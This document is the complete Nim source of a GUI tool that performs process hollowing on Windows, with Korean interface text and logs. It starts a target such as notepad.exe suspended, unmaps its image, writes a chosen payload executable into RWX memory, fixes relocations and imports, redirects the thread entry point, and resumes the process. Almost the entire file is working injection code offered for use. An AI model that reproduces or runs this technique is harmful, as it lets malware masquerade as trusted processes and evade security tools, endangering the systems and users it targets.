# Process Hollowing - Complete Implementation

import nigui, os, strutils, times, strformat
import winim/lean

type
  ProcessHollowingApp = ref object
    window: Window
    targetEntry: TextBox
    payloadEntry: TextBox
    logArea: TextArea
    startButton: Button
    isRunning: bool

# Windows API Constants
const
  CREATE_SUSPENDED = 0x00000004
  MEM_COMMIT = 0x1000
  MEM_RESERVE = 0x2000
  PAGE_EXECUTE_READWRITE = 0x40
  PROCESS_ALL_ACCESS = 0x1F0FFF
  CONTEXT_FULL = 0x10007
  IMAGE_REL_BASED_DIR64 = 10
  IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
  IMAGE_DIRECTORY_ENTRY_IMPORT = 1

proc log(app: ProcessHollowingApp, message: string, level: string = "INFO") =
  let timestamp = now().format("HH:mm:ss")
  let logMsg = "[" & timestamp & "] [" & level & "] " & message
  app.logArea.addLine(logMsg)
  app.logArea.scrollToBottom()

proc browseTarget(app: ProcessHollowingApp) =
  var dialog = newOpenFileDialog()
  dialog.title = "타겟 프로세스 선택"
  dialog.multiple = false
  dialog.run()
  if dialog.files.len > 0:
    app.targetEntry.text = dialog.files[0]

proc browsePayload(app: ProcessHollowingApp) =
  var dialog = newOpenFileDialog()
  dialog.title = "페이로드 선택"
  dialog.multiple = false
  dialog.run()
  if dialog.files.len > 0:
    app.payloadEntry.text = dialog.files[0]

proc readDword(data: string, offset: int): DWORD =
  if offset + 4 <= data.len:
    result = cast[ptr DWORD](unsafeAddr data[offset])[]

proc readQword(data: string, offset: int): DWORD64 =
  if offset + 8 <= data.len:
    result = cast[ptr DWORD64](unsafeAddr data[offset])[]

proc readWord(data: string, offset: int): WORD =
  if offset + 2 <= data.len:
    result = cast[ptr WORD](unsafeAddr data[offset])[]

proc readPEHeader(data: string): tuple[valid: bool, imageSize: int, entryPoint: int, imageBase: int64, e_lfanew: int] =
  result.valid = false
  
  if data.len < 64 or data[0..1] != "MZ":
    return
  
  result.e_lfanew = readDword(data, 0x3C).int
  
  if data.len < result.e_lfanew + 256:
    return
  
  if data[result.e_lfanew..result.e_lfanew+3] != "PE\x00\x00":
    return
  
  let optHeaderOffset = result.e_lfanew + 24
  result.imageBase = readQword(data, optHeaderOffset + 0x18).int64
  result.imageSize = readDword(data, result.e_lfanew + 0x50).int
  result.entryPoint = readDword(data, result.e_lfanew + 0x28).int
  
  result.valid = true

proc processRelocations(app: ProcessHollowingApp, payloadData: string, 
                       remoteImage: LPVOID, originalBase: int64, 
                       e_lfanew: int, hProcess: HANDLE): bool =
  app.log("STEP: Relocation 처리", "STEP")
  
  let relocDirOffset = e_lfanew + 0xA0
  let relocRVA = readDword(payloadData, relocDirOffset)
  let relocSize = readDword(payloadData, relocDirOffset + 4)
  
  if relocRVA == 0 or relocSize == 0:
    app.log("  → Relocation 정보 없음", "INFO")
    return true
  
  let delta = cast[int64](remoteImage) - originalBase
  app.log(&"  → Delta: 0x{delta.toHex}", "INFO")
  
  if delta == 0:
    app.log("  → Delta가 0이므로 Relocation 불필요", "INFO")
    return true
  
  var offset = relocRVA.int
  var processed = 0
  
  while offset < (relocRVA + relocSize).int:
    if offset + 8 > payloadData.len:
      break
    
    let pageRVA = readDword(payloadData, offset)
    let blockSize = readDword(payloadData, offset + 4)
    
    if blockSize == 0 or blockSize < 8:
      break
    
    let numEntries = (blockSize - 8) div 2
    
    for i in 0..<numEntries:
      let entryOffset = offset + 8 + (i * 2)
      if entryOffset + 2 > payloadData.len:
        break
      
      let entry = readWord(payloadData, entryOffset)
      let relocType = entry shr 12
      let relocOffset = entry and 0x0FFF
      
      if relocType == 0:
        continue
      elif relocType == IMAGE_REL_BASED_DIR64:
        let targetRVA = pageRVA + relocOffset.DWORD
        var value: DWORD64
        var bytesRead: SIZE_T
        
        if ReadProcessMemory(hProcess, 
                            cast[LPVOID](cast[int](remoteImage) + targetRVA.int),
                            addr value,
                            sizeof(DWORD64).SIZE_T,
                            addr bytesRead) != 0:
          value = cast[DWORD64](cast[int64](value) + delta)
          
          var bytesWritten: SIZE_T
          discard WriteProcessMemory(hProcess,
                                    cast[LPVOID](cast[int](remoteImage) + targetRVA.int),
                                    addr value,
                                    sizeof(DWORD64).SIZE_T,
                                    addr bytesWritten)
          processed.inc
    
    offset += blockSize.int
  
  app.log(&"  - {processed}개 항목 재배치 완료", "SUCCESS")
  return true

proc processImports(app: ProcessHollowingApp, payloadData: string,
                   remoteImage: LPVOID, e_lfanew: int, hProcess: HANDLE): bool =
  app.log("STEP: Import Table 재구성", "STEP")
  
  let importDirOffset = e_lfanew + 0x90
  let importRVA = readDword(payloadData, importDirOffset)
  
  if importRVA == 0:
    app.log("  → Import Table 없음", "INFO")
    return true
  
  var offset = importRVA.int
  var dllCount = 0
  
  while offset + 20 <= payloadData.len:
    let nameRVA = readDword(payloadData, offset + 12)
    let firstThunk = readDword(payloadData, offset + 16)
    
    if nameRVA == 0:
      break
    
    var dllName = ""
    var nameOffset = nameRVA.int
    while nameOffset < payloadData.len and payloadData[nameOffset] != '\0':
      dllName.add(payloadData[nameOffset])
      nameOffset.inc
    
    if dllName.len == 0:
      break
    
    app.log(&"  → {dllName} 로드", "INFO")
    
    let hModule = LoadLibraryA(dllName)
    if hModule == 0:
      app.log(&"    ⚠ {dllName} 로드 실패", "WARNING")
      offset += 20
      continue
    
    var thunkOffset = firstThunk.int
    var funcCount = 0
    
    while thunkOffset + 8 <= payloadData.len:
      let thunkValue = readQword(payloadData, thunkOffset)
      
      if thunkValue == 0:
        break
      
      var funcAddress: LPVOID = nil
      
      if (thunkValue.uint64 and 0x8000000000000000'u64) != 0:
        let ordinal = thunkValue.uint64 and 0xFFFF
        funcAddress = GetProcAddress(hModule, cast[LPCSTR](ordinal))
      else:
        let nameRVA = (thunkValue.uint64 and 0x7FFFFFFF).int
        if nameRVA + 2 < payloadData.len:
          let hintOffset = nameRVA + 2
          
          var funcName = ""
          var fnOffset = hintOffset
          while fnOffset < payloadData.len and payloadData[fnOffset] != '\0':
            funcName.add(payloadData[fnOffset])
            fnOffset.inc
          
          if funcName.len > 0:
            funcAddress = GetProcAddress(hModule, funcName)
      
      if funcAddress != nil:
        var bytesWritten: SIZE_T
        let iatAddress = cast[LPVOID](cast[int](remoteImage) + thunkOffset)
        
        discard WriteProcessMemory(hProcess,
                                  iatAddress,
                                  addr funcAddress,
                                  sizeof(LPVOID).SIZE_T,
                                  addr bytesWritten)
        funcCount.inc
      
      thunkOffset += 8
    
    app.log(&"    - {funcCount}개 함수 주소 해결", "SUCCESS")
    dllCount.inc
    offset += 20
  
  app.log(&"  - {dllCount}개 DLL Import 완료", "SUCCESS")
  return true

proc runHollowing(app: ProcessHollowingApp) =
  let targetPath = app.targetEntry.text
  let payloadPath = app.payloadEntry.text
  
  if not fileExists(targetPath):
    app.log("타겟 프로세스를 찾을 수 없습니다: " & targetPath, "ERROR")
    return
  
  if not fileExists(payloadPath):
    app.log("페이로드를 찾을 수 없습니다: " & payloadPath, "ERROR")
    return
  
  app.isRunning = true
  app.startButton.enabled = false
  
  try:
    app.log("=" & repeat("=", 79), "INFO")
    app.log("프로세스 할로잉 시작", "INFO")
    app.log("=" & repeat("=", 79), "INFO")
    app.log("타겟: " & targetPath, "INFO")
    app.log("페이로드: " & payloadPath, "INFO")
    app.log("", "INFO")
    
    # Step 1: 페이로드 읽기
    app.log("STEP 1: 페이로드 파일 읽기", "STEP")
    let payloadData = readFile(payloadPath)
    app.log(&"  - 페이로드 크기: {payloadData.len} bytes", "SUCCESS")
    
    let peInfo = readPEHeader(payloadData)
    if not peInfo.valid:
      raise newException(ValueError, "유효하지 않은 PE 파일입니다")
    
    app.log("  - PE 헤더 확인", "SUCCESS")
    app.log("", "INFO")
    
    # Step 2: 타겟 프로세스 생성
    app.log("STEP 2: 타겟 프로세스를 Suspended 상태로 생성", "STEP")
    
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    si.cb = sizeof(STARTUPINFO).DWORD
    
    let targetPathW = newWideCString(targetPath)
    
    let createResult = CreateProcessW(
      targetPathW, nil, nil, nil, FALSE,
      CREATE_SUSPENDED, nil, nil,
      addr si, addr pi
    )
    
    if createResult == 0:
      raise newException(OSError, &"CreateProcess 실패: Error {GetLastError()}")
    
    app.log(&"  - 프로세스 생성 성공 (PID: {pi.dwProcessId})", "SUCCESS")
    app.log("", "INFO")
    
    # Step 3: 메모리 언맵
    app.log("STEP 3: 타겟 프로세스 메모리 언맵", "STEP")
    
    type NtUnmapViewOfSectionProc = proc(processHandle: HANDLE, baseAddress: PVOID): NTSTATUS {.stdcall.}
    
    let ntdll = LoadLibraryA("ntdll.dll")
    if ntdll != 0:
      let ntUnmap = cast[NtUnmapViewOfSectionProc](GetProcAddress(ntdll, "NtUnmapViewOfSection"))
      if ntUnmap != nil:
        discard ntUnmap(pi.hProcess, nil)
        app.log("  - 메모리 언맵 성공", "SUCCESS")
      FreeLibrary(ntdll)
    
    app.log("", "INFO")
    
    # Step 4: 메모리 할당
    app.log("STEP 4: 페이로드를 위한 메모리 할당", "STEP")
    
    var remoteImage = VirtualAllocEx(
      pi.hProcess,
      cast[LPVOID](peInfo.imageBase),
      peInfo.imageSize.SIZE_T,
      MEM_COMMIT or MEM_RESERVE,
      PAGE_EXECUTE_READWRITE
    )
    
    if remoteImage == nil:
      remoteImage = VirtualAllocEx(
        pi.hProcess, nil,
        peInfo.imageSize.SIZE_T,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      )
    
    if remoteImage == nil:
      raise newException(OSError, "VirtualAllocEx 실패")
    
    app.log(&"  - 메모리 할당 성공: 0x{cast[int](remoteImage).toHex}", "SUCCESS")
    app.log("", "INFO")
    
    # Step 5: 페이로드 쓰기
    app.log("STEP 5: 페이로드를 타겟 프로세스에 쓰기", "STEP")
    
    var bytesWritten: SIZE_T
    if WriteProcessMemory(pi.hProcess, remoteImage,
                         unsafeAddr payloadData[0],
                         payloadData.len.SIZE_T,
                         addr bytesWritten) == 0:
      raise newException(OSError, "WriteProcessMemory 실패")
    
    app.log(&"  - {bytesWritten} bytes 쓰기 완료", "SUCCESS")
    app.log("", "INFO")
    
    # Step 6: Relocation 처리
    if not processRelocations(app, payloadData, remoteImage, peInfo.imageBase, peInfo.e_lfanew, pi.hProcess):
      app.log("  ⚠ Relocation 처리 실패", "WARNING")
    app.log("", "INFO")
    
    # Step 7: Import Table 재구성
    if not processImports(app, payloadData, remoteImage, peInfo.e_lfanew, pi.hProcess):
      app.log("  ⚠ Import Table 재구성 실패", "WARNING")
    app.log("", "INFO")
    
    # Step 8: 스레드 컨텍스트 수정
    app.log("STEP 8: 스레드 컨텍스트 수정", "STEP")
    
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    
    if GetThreadContext(pi.hThread, addr ctx) != 0:
      let newEntryPoint = cast[DWORD64](remoteImage) + peInfo.entryPoint.DWORD64
      ctx.Rip = newEntryPoint
      
      if SetThreadContext(pi.hThread, addr ctx) != 0:
        app.log(&"  - Entry Point 변경: 0x{newEntryPoint.toHex}", "SUCCESS")
      else:
        app.log("  - SetThreadContext 실패", "WARNING")
    else:
      app.log("  ⚠ GetThreadContext 실패", "WARNING")
    
    app.log("", "INFO")
    
    # Step 9: 프로세스 재개
    app.log("STEP 9: 프로세스 재개", "STEP")
    
    if ResumeThread(pi.hThread) == cast[DWORD](-1):
      raise newException(OSError, "ResumeThread 실패")
    
    app.log("  - 프로세스 재개 성공", "SUCCESS")
    app.log(&"  - PID {pi.dwProcessId} 실행 중", "SUCCESS")
    app.log("", "INFO")
    
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    
    app.log("=" & repeat("=", 79), "INFO")
    app.log("프로세스 할로잉 완료!", "SUCCESS")
    app.log("=" & repeat("=", 79), "INFO")
    
  except Exception as e:
    app.log("오류 발생: " & e.msg, "ERROR")
  finally:
    app.isRunning = false
    app.startButton.enabled = true

proc startHollowing(app: ProcessHollowingApp) =
  if app.isRunning:
    app.window.alert("이미 실행 중입니다.")
    return
  
  # Simple confirmation - just run it
  runHollowing(app)

proc clearLog(app: ProcessHollowingApp) =
  app.logArea.text = ""

proc showHelp(app: ProcessHollowingApp) =
  app.window.alert(
    "Process Hollowing\n\n" &
    "구현된 기능:\n" &
    "- 프로세스 생성 (Suspended)\n" &
    "- 메모리 언맵\n" &
    "- 메모리 할당 및 쓰기\n" &
    "- Relocation 처리\n" &
    "- Import Table 재구성\n" &
    "- 스레드 컨텍스트 수정\n" &
    "- 프로세스 재개",
    "도움말"
  )

proc createUI(): ProcessHollowingApp =
  result = ProcessHollowingApp()
  result.isRunning = false
  
  app.init()
  
  result.window = newWindow("Process Hollowing")
  result.window.width = 900.scaleToDpi
  result.window.height = 700.scaleToDpi
  
  let container = newLayoutContainer(Layout_Vertical)
  result.window.add(container)
  
  let titleLabel = newLabel("Process Hollowing")
  titleLabel.fontSize = 16
  container.add(titleLabel)
  
  let configFrame = newLayoutContainer(Layout_Vertical)
  container.add(configFrame)
  
  let targetLabel = newLabel("타겟 프로세스:")
  targetLabel.widthMode = WidthMode_Static
  targetLabel.width = 120.scaleToDpi
  configFrame.add(targetLabel)
  
  let targetContainer = newLayoutContainer(Layout_Horizontal)
  configFrame.add(targetContainer)
  result.targetEntry = newTextBox()
  result.targetEntry.text = r"C:\Windows\System32\notepad.exe"
  targetContainer.add(result.targetEntry)
  let targetBtn = newButton("찾기")
  targetBtn.widthMode = WidthMode_Static
  targetBtn.width = 80.scaleToDpi
  let appRef = result  # Create a reference for closure
  targetBtn.onClick = proc(event: ClickEvent) = appRef.browseTarget()
  targetContainer.add(targetBtn)
  
  let payloadLabel = newLabel("페이로드:")
  payloadLabel.widthMode = WidthMode_Static
  payloadLabel.width = 120.scaleToDpi
  configFrame.add(payloadLabel)
  
  let payloadContainer = newLayoutContainer(Layout_Horizontal)
  configFrame.add(payloadContainer)
  result.payloadEntry = newTextBox()
  result.payloadEntry.text = "payload.exe"
  payloadContainer.add(result.payloadEntry)
  let payloadBtn = newButton("찾기")
  payloadBtn.widthMode = WidthMode_Static
  payloadBtn.width = 80.scaleToDpi
  payloadBtn.onClick = proc(event: ClickEvent) = appRef.browsePayload()
  payloadContainer.add(payloadBtn)
  
  let logLabel = newLabel("실행 로그:")
  container.add(logLabel)
  
  result.logArea = newTextArea()
  result.logArea.editable = false
  result.logArea.height = 400.scaleToDpi
  container.add(result.logArea)
  
  let buttonContainer = newLayoutContainer(Layout_Horizontal)
  container.add(buttonContainer)
  
  result.startButton = newButton("실행")
  result.startButton.onClick = proc(event: ClickEvent) = appRef.startHollowing()
  buttonContainer.add(result.startButton)
  
  let clearBtn = newButton("로그 지우기")
  clearBtn.onClick = proc(event: ClickEvent) = appRef.clearLog()
  buttonContainer.add(clearBtn)
  
  let helpBtn = newButton("도움말")
  helpBtn.onClick = proc(event: ClickEvent) = appRef.showHelp()
  buttonContainer.add(helpBtn)

when isMainModule:
  let myApp = createUI()
  myApp.window.show()
  app.run()
